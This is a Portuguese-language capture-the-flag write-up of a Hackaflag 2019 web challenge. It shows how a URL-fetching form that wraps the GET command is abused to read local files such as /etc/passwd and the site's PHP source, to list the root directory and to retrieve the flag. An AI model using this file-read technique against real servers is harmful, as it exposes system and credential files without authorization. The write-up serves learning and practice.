# Don't go breaking my heart

- Desafio da etapa de Belo Horizonte do Hackaflag 2019
- Data do desafio: 2019-06-29
- Categoria: web
- URL original:

A URL leva a uma página com dois campos ("filename" e "Put the URL file") e um botão "send". Inserindo qualquer conteúdo e clicando no botão, a página é atualizada com o caminho do arquivo criado. Ao acessar o arquivo criado, uma página qualquer é carregada. Digitando apenas "abc" no segundo campo, a página do canal americano ABC (`abc.com`) é carregada. Com alguns testes, percebemos que o sistema está buscando o endereço informado no segundo campo e salvando uma cópia em um arquivo com o nome informado no primeiro campo.

Uma possibilidade é criar um código PHP simples e tentar copiá-lo e executá-lo no site. Vamos criar um arquivo no Pastebin com o conteúdo `<?php print("Teste"); ?>`, inserir o endereço (_raw_) no segundo campo e o nome `teste.php` no primeiro campo. Ao enviar, percebemos que o arquivo foi renomeado para `testephp`, removendo o ponto e limitando a possibilidade de especificar extensões.

Outra possibilidade é inserir uma URL **local** da máquina. Se inserirmos `localhost`, obtemos a própria página novamente. Inserindo `/etc/passwd`, obtemos o seguinte resultado:

```
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
libuuid:x:100:101::/var/lib/libuuid:
syslog:x:101:104::/home/syslog:/bin/false
mysql:x:102:105:MySQL Server,,,:/nonexistent:/bin/false
```

O conteúdo retornado indica que é possível acessar arquivos locais. Inserindo `/var/www/html/index.php` e inspecionado o código-fonte da página gerada, obtemos o código-fonte em PHP, que confirma nossas suspeitas: o programa executa o comando `GET`.

```php
<?php
ini_set('display_errors',1);
ini_set('display_startup_erros',1);
error_reporting(E_ALL);
$sandbox = "uploads/" . md5("x09x09x09x0x90x90x909x09x0aaa___" . $_SERVER["REMOTE_ADDR"]);
@mkdir($sandbox);
@chdir($sandbox);

if(isset($_POST['urlfile'])){
  $data = shell_exec("GET " . escapeshellarg($_POST["urlfile"]));
  $info = pathinfo($_POST["name"]);
  $dir  = str_replace(".", "", basename($info["dirname"]));
  @mkdir($dir);
  @chdir($dir);
  @file_put_contents(str_replace(".","",basename($info["basename"])), $data);
  if(file_exists(str_replace(".","",basename($info['basename'])))){
    $ok = 'file: '.$sandbox."/".str_replace(".","",basename($info['basename']));
  }else{
    $text = 'error';
  }
}
?>
<html>
<head>
<title>xxx</title>
        <link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.3.1/css/bootstrap.min.css" integrity="sha384-ggOyR0iXCbMQv3Xipma34MD+dH/1fQ784/j6cY/iJTQUOhcWr7x9JvoRxT2MZw1T" crossorigin="anonymous">

</head>
<body>
<div class='container'>
<form method='post'>
<input name='name' placeholder='filename'>
<input name='urlfile' placeholder='Put the URL file'>
<button type='submit' class='btn'>send</button>
</form>
</div>
<div class='container'>
<?php
if(isset($ok)){
  echo $ok;
}else if(isset($text)){
  echo $text;
}
?>
</div>
</body>
</html>
```

Inserindo apenas `/` no segundo campo, o comando `GET` retornará todos os arquivos e pastas na raiz do sistema.

> Directory listing of /
> 
> - ./
> - ../
> - .dockerenv
> - 41eb682bbf429e4a3aeff0c721af38cc
> - app/
> - bin/
> - boot/
> - create_mysql_admin_user.sh
> - dev/
> - etc/
> - home/
> - lib/
> - lib64/
> - media/
> - mnt/
> - opt/
> - proc/
> - root/
> - run/
> - run.sh
> - sbin/
> - srv/
> - start-apache2.sh
> - start-mysqld.sh
> - sys/
> - tmp/
> - usr/
> - var/
> - x

Um dos arquivos chama a atenção: `41eb682bbf429e4a3aeff0c721af38cc`. Inserindo `/41eb682bbf429e4a3aeff0c721af38cc` no segundo campo, obtemos o conteúdo dele: `HACKAFLAG{uuuh_1_couldnt_1f_1_tr13d}`.
